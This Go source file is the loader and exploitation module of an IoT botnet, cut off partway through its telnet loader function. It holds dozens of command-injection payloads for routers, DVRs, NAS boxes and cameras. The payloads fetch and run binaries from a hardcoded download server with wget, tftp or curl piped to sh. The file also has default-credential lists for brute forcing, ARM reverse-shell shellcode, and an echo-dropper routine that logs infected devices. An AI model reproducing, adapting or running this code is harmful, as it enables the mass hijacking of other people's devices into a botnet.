package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"crypto/md5"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	dac "github.com/xinsnake/go-http-digest-auth-client"
)

var sem = make(chan struct{}, 100)

const (
	timeout = 10 * time.Second

	EI_NIDENT int = 16
	EI_DATA   int = 5
	EE_LITTLE int = 1
	EE_BIG    int = 2

	EM_ARM     int = 40
	EM_MIPS    int = 8
	EM_AARCH64 int = 183
	EM_PPC     int = 20
	EM_PPC64   int = 21
	EM_SH      int = 42

	DVRIP_NORESP   int = 0
	DVRIP_OK       int = 100
	DVRIP_FAILED   int = 203
	DVRIP_UPGRADED int = 515

	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"

	logFolder  = "report_bots"
	logEnabled = true

	indiaGponAuth        = "YWRtaW46bmlnZ2VyREQ4M0BA"
	indiaGponDefaultAuth = "YWRtaW46YWRtaW4="

	echoLineLen    = 128
	echoDlrOutFile = ".pi"

	loaderTvtWebTag    = "multi.tvt"
	loaderTvt4567Tag   = "multi.tvt"
	loaderVigorTag     = "multi.vigor"
	loaderComtrendTag  = "multi.comtrend"
	loaderGponfiberTag = "multi.gponfiber"
	loaderFiberhomeTag = "multi.fiberhome"
	loaderLibdvrTag    = "multi.libdvr"
	loaderDvripTag     = "multi.dvrip"
	loaderUchttpdTag   = "multi.uchttpd"
	loaderHongdianTag  = "multi.hongdian"
	loaderTendaTag     = "multi.tenda"
	loaderTotolinkTag  = "multi.totolink"
	loaderMultiDvrTag  = "multi.multiDVR"
	loaderZyxelTag     = "multi.zyxel"
	loaderAlcatleTag   = "multi.alcatel"
	loaderLilinTag     = "multi.lilin"
	loaderPdvrTag      = "multi.pdvr"
	loaderLinksysTag   = "multi.linksys"
	loaderUsgFlexTag   = "multi.usgflex.mips"
	loaderZteTag       = "multi.zte"
	loaderNetgearTag   = "multi.netgear"
	loaderDlinkTag     = "multi.dlink"
	loaderZhoneTag     = "multi.zhone"
	loaderJawsTag      = "multi.jaws"
	loaderDreamBoxTag  = "multi.dm900"
	loaderFaithTag     = "multi.faith"
	loaderVoipTag      = "multi.voip"
	loaderOGZteTag     = "multi.OGzte"
	loaderSpainTag     = "multi.spain"
	loaderBoaTag       = "multi.boa"
	loaderAsusTag      = "multi.asusrt"
	loaderGargoyleTag  = "multi.gargoyle"
	loaderGoCloudTag   = "multi.gocloud"
	loaderBaicellsTag  = "multi.baicells"

	executeMessage = "vT"

	reverseDownloadServer = "160.30.44.120"
	loaderServerIP        = "160.30.44.120"

	arm7 = "neon.armv7l"
	arm6 = "neon.armv6l"
	arm5 = "neon.armv5l"
	arm  = "neon.armv4l"
	mips = "neon.mips"
	mpsl = "neon.mipsel"
	ppc  = "neon.powerpc"
	sh4  = "neon.sh4"

	LoaderDownloadServer  = "160.30.44.120"
	LoaderBinsLocation    = "/dwrioej/"
	LoaderBinsDirectory   = "dwrioej"
	LoaderScriptsLocation = "/"
)

var (
	weedTimezones = []string{}

	telecomCreds = []string{"telecomadmin:admintelecom", "telnetadmin:telnetadmin"}

	ipcamLogins = []string{"user:user", "admin:admin", "admin:123456", "admin:12345", "admin:1234", "admin:123", "admin:12", "admin:1", "admin:1111", "admin:2222", "admin:3333", "admin:4444", "admin:5555", "admin:6666", "admin:7777", "admin:8888", "admin:9999", "admin:11111", "admin:22222", "admin:33333", "admin:44444", "admin:55555", "admin:66666", "admin:77777", "admin:88888", "admin:99999"}

	fiberhomeLogins = []string{"f%7Ei%21b%40e%23r%24h%25o%5Em*esuperadmin:s%28f%29u_h%2Bg%7Cu", "adminisp:adminisp", "admin:admin", "admin:123456", "admin:user", "admin:1234", "guest:guest", "support:support", "user:user", "admin:password", "default:default", "admin:password123"}

	twVideoServerLogins = []string{"admin:admin", "admin:123456", "admin:12345", "admin:1234", "user:user"}

	gargoyleLogins = []string{"admin:admin", "root:admin", "root:root"}
)

type elfHeader struct {
	e_ident           [EI_NIDENT]int8
	e_type, e_machine int16
	e_version         int32
}

type smapsRegion struct {
	region                       uint64
	size, pss, rss               int
	shared_clean, shared_ditry   int
	private_clean, private_dirty int
}

type echoDropper struct {
	payload       [128]string
	payload_count int
}

var (
	netTimeout      time.Duration = 30
	workerGroup     sync.WaitGroup
	magicGroup      sync.WaitGroup
	mode, doExploit string
	exploitMap      map[string]interface{}
	dropperMap      map[string]echoDropper
)

// counters
var telShells, payloadSent, reverseShells int

var (
	brickcomPayload  = "wget${IFS}http://" + LoaderDownloadServer + "/vc${IFS}-O${IFS}/tmp/vc"
	brickcomPayload2 = "chmod${IFS}777${IFS}/tmp/vc"
	brickcomPayload3 = "/tmp/vc"

	gozyPayload = "cd+%2Ftmp%3B+rm+-rf+" + mpsl + "%3B+tftp+-g+-r+" + mpsl + "+" + LoaderDownloadServer + "+69%3B+chmod+777+" + mpsl + "%3B.%2F" + mpsl + "+gozy"

	wavlinkPayload = "cd+%2Ftmp%3B+rm+-rf+" + mpsl + "%3B+wget+http%3A%2F%2F" + LoaderDownloadServer + "%2F" + LoaderBinsDirectory + "%2F" + mpsl + "%3B+chmod+777+" + mpsl + "%3B+.%2F" + mpsl + "+wavlink"

	hongdianTelnetPayload = "cd /tmp; rm -rf " + mpsl + "; wget http://" + LoaderDownloadServer + "/" + LoaderBinsDirectory + "/" + mpsl + "; chmod 777 " + mpsl + "; chmod 777 " + mpsl + "; ./" + mpsl + " " + loaderHongdianTag

	ipcamPayload = "wget%20-O-%20http%3A%2F%2F" + LoaderDownloadServer + "%2Fipc%7Csh"

	goformPayloadPing = "cd+%2Ftmp%3Brm+-rf+" + mpsl + "%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2F" + LoaderBinsDirectory + "%2F" + mpsl + "%3B+chmod+777+" + mpsl + "%3B+.%2F" + mpsl + "+cnr"

	goformPayloadCmdWget = "cd+%2Ftmp%3Brm+-rf+" + mpsl + "%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2F" + LoaderBinsDirectory + "%2F" + mpsl + "%3B+chmod+777+" + mpsl + "%3B+.%2F" + mpsl + "+cnr"
	goformPayloadCmdTftp = "cd+%2Ftmp%3B+rm+-rf+" + mpsl + "%3B+tftp+-g+-r+" + mpsl + "+" + LoaderDownloadServer + "+69%3B+chmod+777+" + mpsl + "%3B.%2F" + mpsl + "+cnr"

	goformPayloadCmdProtShellWget = "ping%3B+cd+%2Ftmp%3B+rm+-rf+" + mpsl + "%3B+wget+http%3A%2F%2F" + LoaderDownloadServer + "%2F" + LoaderBinsDirectory + "%2F" + mpsl + "%3B+chmod+777+" + mpsl + "%3B+.%2F" + mpsl + "+cnr"
	goformPayloadCmdProtShellTftp = "ping%3B+cd+%2Ftmp%3B+rm+-rf+" + mpsl + "%3B+tftp+-g+-r+" + mpsl + "+" + LoaderDownloadServer + "+69%3B+chmod+777+" + mpsl + "%3B.%2F" + mpsl + "+cnr"

	telecomPayload = "cd ..; cd ..; cd ..;cd /var/tmp; rm -rf " + mips + "; tftp -g -r " + mips + " " + LoaderDownloadServer + " 69; chmod 777 " + mips + ";./" + mips + " telecom"

	usgflexPayload = "cd /tmp; rm -rf " + mips + "; wget http://" + LoaderDownloadServer + "/" + LoaderBinsDirectory + "/" + mips + "; chmod 777 " + mips + "; ./" + mips + " " + loaderUsgFlexTag

	dreamboxPayload = "cd%20%2Ftmp%3B%20rm%20-rf%201.sh%3B%20wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2F1.sh%3B%20chmod%20777%201.sh%3B%20.%2F1.sh%20" + loaderDreamBoxTag

	weedPayload = "wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2Fweed%20-O-%7Csh"

	IRZpayload = "wget -O- http://" + LoaderDownloadServer + "/irz|sh"

	gponFiberPayload = "target_addr=%3Brm%20-rf%20/var/tmp/stainfo%3Bwget%20http://" + LoaderDownloadServer + LoaderBinsLocation + mips + "%20-O%20->/var/tmp/stainfo%3Bchmod%20777%20/var/tmp/stainfo%3B/var/tmp/stainfo%20" + loaderGponfiberTag + "&waninf=1_INTERNET_R_VID_"

	ruijiePayload = "rm%20-rf%20k.sh%3B%20busybox%20wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2Fk.sh%3B%20sh%20k.sh"

	SDTpayload = "wget%20-O-%20http%3A%2F%2F" + LoaderDownloadServer + "%2Fsdt%7Csh"

	seaGatePayload = "wget%20-O-%20http%3A%2F%2F" + LoaderDownloadServer + "%2Ffdgsfg%7Csh"

	unauthDvrPayloads = []string{"/bin/chmod 777 /tmp/hello", "/tmp/hello", "/bin/chmod " + echoDlrOutFile, "./" + echoDlrOutFile + " UnauthDVR"}

	ruckusPayload = "wget -O- http://" + LoaderDownloadServer + "/ruck|sh"

	indiaGponPayload = "cd /var/tmp/;rm -rf aa; wg${nIPVmTVQGGUJL}et http://" + LoaderDownloadServer + "/" + LoaderBinsDirectory + "/" + arm7 + " -O aa;chm${PvKefDsivIsPc}od +x aa;./aa gpon"

	// baicells
	baicellsPayload = []string{"wget+http://" + LoaderDownloadServer + "/" + LoaderBinsDirectory + "/" + arm7 + "", "chmod+777+" + arm7 + "", "./" + arm7 + "+" + loaderBaicellsTag}

	goCloudPayloads = []string{"wget -O- http://" + LoaderDownloadServer + "/gocl|sh"}

	// qnap
	qnapPayload = "wget%20-O-%20http%3A%2F%2F" + LoaderDownloadServer + "%2Faaa%7Csh"

	twVideoServerPayload = "wget+-O-+http%3A%2F%2F" + LoaderDownloadServer + "%2Fzz%7Csh"

	// multidvr
	multiDvrPayload = "wget -O- http://" + LoaderDownloadServer + "/multi|sh"

	// uc exploit settings
	// should be reverse shell to same ip as loader on port 31412
	uchttpdShellCode string = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x11\xa1\x8a\x78\x01\x3a\x8a\x70\x02\x21\x08\x1c\x01\x21\x92\x1a\x0f\x02\x19\x37\x01\xdf\x06\x1c\x0b\xa1\x02\x23\x0b\x80\x10\x22\x02\x37\x01\xdf\x3e\x27\x01\x37\xc8\x21\x30\x1c\x01\xdf\x01\x39\xfb\xd5\x07\xa0\x92\x1a\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x01\x21\x08\x1c\x01\xdf\xc0\x46\xff\xff\x7b\xb4\x2d\x8c\xbd\x78\x2f\x62\x69\x6e\x2f\x73\x68\x58\xff\xff\xc0\x46\xef\xbe\xad\xde"
	ucRshellPort     int    = 31412

	gargoylePayload = "cd%20%2Ftmp%3B%20rm%20-rf%20mpsl%3B%20wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2F" + LoaderBinsDirectory + "%2Fmpsl%3B%20chmod%20%2Bx%20mpsl%3B%20.%2Fmpsl%20" + loaderGargoyleTag

	ztePayload = "cd /var; wget http://" + LoaderDownloadServer + LoaderBinsLocation + arm7 + "; chmod 777 " + arm7 + "; ./" + arm7 + " " + loaderZteTag

	pdvrPayload = "sh%20-c%20%27wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2Flll%20-O-%7Csh%27%20%26%0A"

	// og zte exploit settings
	zteOGPayload string = "cd /tmp;wget http://" + LoaderDownloadServer + LoaderBinsLocation + mips + "; chmod 777 " + mips + ";./" + mips + " " + loaderOGZteTag

	// boa exploit settings
	boaPayload = "wget+-O-+http%3A%2F%2F" + LoaderDownloadServer + "%2Fxaxa%7Csh"

	// spain exploit settings
	spainPayload string = "cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2F" + LoaderBinsDirectory + "%2F" + mpsl + "%3B%20chmod%20%2Bx%20" + mpsl + "%3B%20.%2F" + mpsl + "%20" + loaderSpainTag

	// tvt exploit settings
	tvtWebPayload  string = "cd${IFS}/tmp;wget${IFS}http://" + LoaderDownloadServer + LoaderScriptsLocation + "1.sh${IFS}-O-${IFS}>sfs;chmod${IFS}777${IFS}sfs;sh${IFS}sfs${IFS}" + loaderTvtWebTag
	tvt4567Payload string = "cd${IFS}/tmp;wget${IFS}http://" + LoaderDownloadServer + LoaderScriptsLocation + "1.sh${IFS}-O-${IFS}>sfs;chmod${IFS}777${IFS}sfs;sh${IFS}sfs${IFS}" + loaderTvt4567Tag

	// zhone exploit settings
	zhonePayload string = "killall%20g%3B%20%2Fbin%2Fbusybox%20wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2F" + LoaderBinsDirectory + "%2F" + mips + "%20-O%20%2Fvar%2Fi%3B%20chmod%20777%20%2Fvar%2Fi%3B%20%2Fvar%2Fi%20" + loaderZhoneTag

	// faith exploit settings
	faithPayload string = "cd /tmp; rm -rf " + mpsl + "; wget http://" + LoaderDownloadServer + LoaderBinsLocation + mpsl + "; chmod 777 " + mpsl + "; ./" + mpsl + " " + loaderFaithTag

	// avtech payload
	avtechPayload string = "cd /tmp; rm -rf av.sh; /bin/busybox ftpget " + LoaderDownloadServer + " -P 8021 av.sh av.sh; sh av.sh"

	// dlink DCS exploit settings
	dlinkDcsPayload string = "curl%20" + LoaderDownloadServer + "/1.sh%7Csh"

	// jaws exploit settings
	jawsPayload = "cd+/tmp;rm+-rf+%s;wget+http:/\\/" + LoaderDownloadServer + "/" + LoaderBinsDirectory + "/%s;chmod+777+%s;./%s+" + loaderJawsTag

	// magic exploit settings
	magicPacketIds []string = []string{"\x62", "\x69", "\x6c", "\x52", "\x44", "\x67", "\x43", "\x4d"}
	magicPorts     []int    = []int{1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8020, 8030, 8040, 8050, 8060, 8070, 8080, 8090, 8100, 8200, 8300, 8400, 8500, 8600, 8700, 8800, 8888, 8900, 8999, 9000, 9090}
	magicPayload   string   = "wget -O- http://" + LoaderDownloadServer + "/mag|sh;"

	// lilindvr payload
	lilinPayload string = "wget -O- http://" + LoaderDownloadServer + "/linnn|sh"

	// fiberhome exploit settings
	fiberRandPort   int      = 1 // 0 for use below
	fiberStaticPort int      = 31784
	fiberSecStrs    []string = []string{"0.3123525368318707", "0.13378587435314315", "0.8071510413685209"}

	// vigor exploit settings
	vigorPayload string = "bin%2Fsh%24%7BIFS%7D-c%24%7BIFS%7D%27cd%24%7BIFS%7D%2Ftmp%24%7BIFS%7D%26%26%24%7BIFS%7Dbusybox%24%7BIFS%7Dwget%24%7BIFS%7Dhttp%3A%2F%2F" + LoaderDownloadServer + LoaderBinsLocation + "" + arm7 + "%24%7BIFS%7D%26%26%24%7BIFS%7Dchmod%24%7BIFS%7D777%24%7BIFS%7D" + arm7 + "%24%7BIFS%7D%26%26%24%7BIFS%7D.%2F" + arm7 + "%24%7BIFS%7D" + loaderVigorTag + "%24%7BIFS%7D%26%26%24%7BIFS%7Drm%24%7BIFS%7D-rf%24%7BIFS%7D" + arm7

	// broadcom router settings
	broadcomPayload string = "$(wget%20http://" + LoaderDownloadServer + "/b%20-O-|sh)"

	// hongdian router settings
	hongdianPayload string = "cd+/tmp%3Bbusybox+wget+http://" + LoaderDownloadServer + LoaderScriptsLocation + "1.sh+-O-+>sfs;chmod+777+sfs%3Bsh+sfs+" + loaderHongdianTag + "%3Brm+-rf+sfs"

	// tenda router settings
	tendaPayload string = "cd%20/tmp%3Brm%201.sh%3Bwget%20http%3A//" + LoaderDownloadServer + LoaderScriptsLocation + "1.sh%3Bchmod%20777%201.sh%3Bsh%201.sh%20" + loaderTendaTag

	// totlink router settings
	totolinkPayload string = "wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2F1.sh%20-O%20-%20%3E1.sh%3B%20chmod%20777%201.sh%3B%20sh%201.sh%20" + loaderTotolinkTag

	// zyxel nas settings
	zyxelPayload    string = "wget%20http%3A%2F%2F" + LoaderDownloadServer + "%2Fz.sh%20-O%20-%20%7C%20sh%20%23"
	zyxelPayloadTwo string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2F1.sh%3Bchmod+777+1.sh%3Bsh+1.sh+" + loaderZyxelTag + "%3Brm+-rf+1.sh"

	// alcatel nas settings
	alcatelPayload string = "cd${IFS}/tmp;wget${IFS}http://" + LoaderDownloadServer + LoaderScriptsLocation + "1.sh${IFS}-O-${IFS}>sfs;chmod${IFS}777${IFS}sfs;sh${IFS}sfs${IFS}" + loaderAlcatleTag

	// linksys router settings
	linksysPayload    string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2Fa%2Flinksys%3Bsh+linksys+" + loaderLinksysTag + "%3Brm+-rf+linksys"
	linksysTwoPayload string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2F1.sh%3Bchmod+777+1.sh%3Bsh+1.sh+" + loaderLinksysTag + "%3Brm+-rf+1.sh"

	// zte router settings
	zteNewPayload string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2F1.sh%3Bchmod+777+1.sh%3Bsh+1.sh+" + loaderZyxelTag + "%3Brm+-rf+1.sh"

	// netgear router settings
	netgearPayload string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2F1.sh%3Bchmod+777+1.sh%3Bsh+1.sh+" + loaderNetgearTag + "%3Brm+-rf+1.sh"

	// gpon router settings
	gponOGPayload string = "wget+http%3A%2F%2F" + LoaderDownloadServer + "%2Fg+-O-%7Csh%60%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2Fg+-O-%7Csh"

	// dlink router settings
	dlinkTwoPayload   string = "cd+%2Ftmp%3Bwget+http%3A%2F%2F" + LoaderDownloadServer + "%2Fa%2F1.sh%3Bchmod+777+1.sh%3Bsh+1.sh+" + loaderDlinkTag + "%3Brm+-rf+1.sh"
	dlinkThreePayload string = "cd /tmp;wget http://" + LoaderDownloadServer + "/1.sh;chmod 777 1.sh;sh 1.sh " + loaderDlinkTag + ";rm -rf 1.sh"
)

func NewSHA256(data []byte) []byte {
	hash := sha256.Sum256(data)
	return hash[:]
}

func zeroByte(a []byte) {

	for i := range a {
		a[i] = 0
	}
}

func logDevice(target, name string) {

	if logEnabled == true {
		ip := strings.Split(target, ":")[0]

		f, err := os.OpenFile(logFolder+"/"+name+"_infected.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)

		if err != nil {
			fmt.Println(err)
			return
		}

		fmt.Fprintf(f, ip+"\n")
	}
}

func telnetRead(conn net.Conn, prompt string) bool {

	for {
		buff := make([]byte, 1024)
		len, err := conn.Read(buff)

		if len <= 0 {
			return false
		}

		if err != nil {
			return false
		}

		buf := string(buff)

		if strings.Contains(buf, prompt) {
			return true
		}
	}

	return false
}

func readArch(dlr string) []string {
	f, err := os.Open(dlr)

	if err != nil {
		fmt.Printf("Failed to open %s!\n", dlr)
		os.Exit(1)
	}

	tmp_hex := ""
	buf := make([]byte, 32)
	hex_arr := make([]byte, 1)

	var dlr_hex []string

	for {
		_, err := f.Read(buf)

		if err == io.EOF {
			break
		}

		for _, ch := range buf {
			hex_arr[0] = ch
			hx := hex.EncodeToString(hex_arr)
			tmp_hex += "\\x" + hx
		}

		dlr_hex = append(dlr_hex, tmp_hex)
		tmp_hex = ""
	}

	return dlr_hex
}

func waitForPromptBanner(conn net.Conn, prompt string) bool {

	for {
		buff := make([]byte, 1024)

		conn.SetDeadline(time.Now().Add(timeout))

		_, err := conn.Read(buff)

		if err != nil {
			return false
		}

		if strings.Contains(string(buff), prompt) {
			return true
		}
	}
}

func stipByte(a []byte) {
	for i := 0; i < len(a); i++ {
		if a[i] == 0x0D || a[i] == 0x0A {
			a[i] = 0x00
		}
	}
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func getStringInBetween(str string, start string, end string) (result string) {

	s := strings.Index(str, start)
	if s == -1 {
		return
	}

	s += len(start)
	e := strings.Index(str, end)

	if s > 0 && e > s+1 {
		return str[s:e]
	} else {
		return "null"
	}
}

func waitForPrompt(conn net.Conn) bool {
	bufb := make([]byte, 4096)
	conn.Read(bufb)

	buf := string(bufb)

	if strings.Contains(buf, ":") || strings.Contains(buf, "#") || strings.Contains(buf, ">") || strings.Contains(buf, "$") {
		return true
	}

	return false
}

func waitForExec(conn net.Conn) bool {
	bufb := make([]byte, 4096)
	conn.Read(bufb)

	buf := string(bufb)

	return strings.Contains(buf, executeMessage)
}

func randStr(strlen int) string {

	var b strings.Builder

	rand.Seed(time.Now().UnixNano())
	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")

	for i := 0; i < strlen; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}

	return b.String()
}

func hexToInt(hexStr string) uint64 {
	cleaned := strings.Replace(hexStr, "0x", "", -1)
	result, _ := strconv.ParseUint(cleaned, 16, 64)
	return uint64(result)
}

/*        TELNET LOADER MODULE         */

func telnetLoadDroppers() {

	files, err := ioutil.ReadDir("dlrs")
	if err != nil {
		fmt.Printf("\033[1;31mError: Failed to open dlrs/\r\n")
		os.Exit(0)
	}

	for i := 0; i < len(files); i++ {
		file, err := os.OpenFile("dlrs/"+files[i].Name(), os.O_RDONLY, 0755)
		if err != nil {
			continue
		}

		mapVal := echoDropper{}
		mapVal.payload_count = 0

		for {
			var echoString string
			dataBuf := make([]byte, echoLineLen)

			length, err := file.Read(dataBuf)
			if err != nil || length <= 0 {
				break
			}

			for i := 0; i < length; i++ {
				echoByte := fmt.Sprintf("\\x%02x", uint8(dataBuf[i]))
				echoString += echoByte
			}

			if mapVal.payload_count == 0 {
				mapVal.payload[mapVal.payload_count] = fmt.Sprintf("echo -ne \"%s\" > ", echoString)
			} else {
				mapVal.payload[mapVal.payload_count] = fmt.Sprintf("echo -ne \"%s\" >> ", echoString)
			}

			mapVal.payload_count++
		}

		dropperMap[files[i].Name()] = mapVal
		file.Close()
	}

	fmt.Printf("\x1b[38;5;46mLoader\x1b[38;5;15m: \x1b[38;5;15mLoaded \x1b[38;5;134m%d\x1b[38;5;15m echo droppers\x1b[38;5;15m\x1b[38;5;15m\r\n", len(dropperMap))
}

func telnetHasPrompt(buffer string) bool {

	if strings.Contains(buffer, "#") || strings.Contains(buffer, ">") || strings.Contains(buffer, "$") || strings.Contains(buffer, "%") || strings.Contains(buffer, "@") {
		return true
	} else {
		return false
	}
}

func telnetBusyboxShell(conn net.Conn) {

	/* Looks wierd but dw its for some BCM router */
	conn.Write([]byte("sh\r\n"))
	conn.Write([]byte("..\r\n"))
	conn.Write([]byte("linuxshell\r\n"))
	/* ------------------------------------------ */

	conn.Write([]byte("enable\r\n"))
	conn.Write([]byte("development\r\n"))
	conn.Write([]byte("system\r\n"))
	conn.Write([]byte("sh\r\n"))
	conn.Write([]byte("shell\r\n"))
	conn.Write([]byte("ping ; sh\r\n"))
}

func telnetDropDropper(conn net.Conn, myarch string) bool {

	for arch, mapval := range dropperMap {
		splitVal := strings.Split(arch, ".")
		if len(splitVal) != 2 {
			continue
		}

		if splitVal[1] == myarch {
			query := randStr(5)
			dropper := randStr(5)
			droppedLines := 0

			conn.Write([]byte("/bin/busybox cp /bin/echo /tmp/" + dropper + "\r\n"))
			time.Sleep(3 * time.Second)

			for i := 0; i < mapval.payload_count; i++ {
				var rdbuf []byte = []byte("")
				complete := 0

				conn.Write([]byte(mapval.payload[i] + dropper + "; /bin/busybox " + query + "\r\n"))

				for {
					tmpbuf := make([]byte, 128)
					ln, err := conn.Read(tmpbuf)
					if ln <= 0 || err != nil {
						break
					}

					rdbuf = append(rdbuf, tmpbuf...)
					if strings.Contains(string(rdbuf), ": applet not found") {
						complete = 1
						break
					}
				}

				if complete == 0 {
					return false
				}

				droppedLines++
			}

			if droppedLines == mapval.payload_count {
				var rdbuf []byte = []byte("")

				conn.Write([]byte("chmod 777 " + dropper + "; ./" + dropper + "; rm -rf " + dropper + "; /bin/busybox " + query + "\r\n"))

				for {
					tmpbuf := make([]byte, 128)
					ln, err := conn.Read(tmpbuf)
					if ln <= 0 || err != nil {
						break
					}

					rdbuf = append(rdbuf, tmpbuf...)
					if strings.Contains(string(rdbuf), ": applet not found") {
						return true
					}
				}

				return false
			} else {
				return false
			}
		} else {
			continue
		}
	}

	return false
}

func telnetHasBusybox(conn net.Conn) (bool, string) {

	var rdbuf []byte = []byte("")

	query := randStr(6)
	resp := ": applet not found"

	conn.Write([]byte("/bin/busybox " + query + "\r\n"))
	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), resp) == true {
			index := strings.Index(string(rdbuf), "BusyBox v")
			if index == -1 {
				return true, "unknown"
			} else {
				verstr := strings.Split(string(rdbuf)[len("BusyBox v")+index:], " ")
				if len(verstr) > 0 {
					return true, verstr[0]
				} else {
					return true, "unknown"
				}

			}
		}
	}

	return false, "unknown"
}

func telnetWritableDir(conn net.Conn) (bool, string) {

	var rdbuf []byte
	dirs := []string{"/tmp/", "/var/tmp/", "/var/", "/mnt/", "/etc/", "/", "/dev/", "/dev/shm", "/run"}

	for i := 0; i < len(dirs); i++ {
		echoStr := randStr(4)
		conn.Write([]byte("cd " + dirs[i] + " && echo " + echoStr + "\r\n"))

		for {
			tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
				break
			}

			rdbuf = append(rdbuf, tmpbuf...)
			if strings.Contains(string(rdbuf), "can't cd") || strings.Contains(string(rdbuf), "No such file or") {
				break
			} else if strings.Contains(string(rdbuf), echoStr) {
				return true, dirs[i]
			}
		}

		zeroByte(rdbuf)
	}

	return false, "none"
}

func telnetExtractArch(conn net.Conn) (bool, string) {

	var rdbuf []byte
	var index int = -1

	conn.Write([]byte("/bin/busybox cat /bin/echo\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		index = strings.Index(string(rdbuf), "ELF")

		if index != -1 {
			zeroByte(tmpbuf)
			ln, err := conn.Read(tmpbuf)

			if ln <= 0 || err != nil {
				break
			}

			rdbuf = append(rdbuf, tmpbuf...)
			break
		}
	}

	if index == -1 {
		return false, "none"
	}

	rdbuf = rdbuf[index:]
	elfHdr := elfHeader{}

	for i := 0; i < EI_NIDENT; i++ {
		elfHdr.e_ident[i] = int8(rdbuf[i])
	}

	elfHdr.e_type = int16(rdbuf[EI_NIDENT])
	elfHdr.e_machine = int16(rdbuf[EI_NIDENT+2])
	elfHdr.e_version = int32(rdbuf[EI_NIDENT+2+2])

	if elfHdr.e_machine == int16(EM_ARM) {
		return true, "arm"
	} else if elfHdr.e_machine == int16(EM_MIPS) {
		if elfHdr.e_ident[EI_DATA] == int8(EE_LITTLE) {
			return true, "mpsl"
		} else {
			return true, "mips"
		}
	} else if elfHdr.e_machine == int16(EM_PPC) || elfHdr.e_machine == int16(EM_PPC64) {
		return true, "ppc"
	} else if elfHdr.e_machine == int16(EM_SH) {
		return true, "sh4"
	}

	return false, ""
}

func telnetLoader(target string, dologin int, arch string, tag string, command string) {

	var (
		rdbuf    []byte = []byte("")
		loggedIn int    = 0
	)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	if dologin == 0 {
		for {
			tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
				break
			}

			rdbuf = append(rdbuf, tmpbuf...)
			if telnetHasPrompt(string(rdbuf)) == true {
				loggedIn = 1
				break
			}
		}
	}

	zeroByte(rdbuf)
	if loggedIn == 0 {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s:%s\x1b[38;5;15m shell found on device\x1b[38;5;15m\x1b[38;5;15m\r\n", target, tag)
	telnetBusyboxShell(conn)

	has, ver := telnetHasBusybox(conn)
	if has == false {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s:%s\x1b[38;5;15m device is running busybox version \x1b[38;5;134m%s\x1b[38;5;15m\r\n", target, tag, ver)
	telShells++

	has, dir := telnetWritableDir(conn)
	if has == false {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s:%s:v%s\x1b[38;5;15m found writable directory \x1b[38;5;134m%s\x1b[38;5;15m\r\n", target, tag, ver, dir)

	has, _ = telnetHasBusybox(conn)
	if has == false {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s:%s:v%s:%s\x1b[38;5;15m extracted arch \x1b[38;5;134m%s\x1b[38;5;15m\r\n", target, tag, ver, dir, arch)

	dropped := telnetDropDropper(conn, arch)
	if dropped == false {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mTelnet\x1b[38;5;15m: \x1b[38;5;134m%s:%s:v%s:%s:%s\x1b[38;5;15m finnished echo loading\x1b[38;5;15m\r\n", target, tag, ver, dir, arch)

	conn.Write([]byte("/bin/busybox chmod 777 " + echoDlrOutFile + ";./" + echoDlrOutFile + " " + tag + "\r\n"))

	// Done?
